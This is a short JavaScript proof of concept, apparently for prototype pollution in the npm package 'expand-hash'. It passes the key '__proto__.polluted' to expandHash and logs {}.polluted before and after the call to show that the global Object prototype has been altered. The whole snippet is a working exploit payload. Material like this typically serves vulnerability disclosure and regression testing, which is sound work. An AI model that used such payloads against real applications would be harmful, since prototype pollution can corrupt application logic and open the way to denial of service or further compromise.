var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
var expandHash = require('expand-hash');
var obj = {};
console.log({}.polluted);
expandHash({ '__proto__.polluted': 'yes' });
console.log({}.polluted);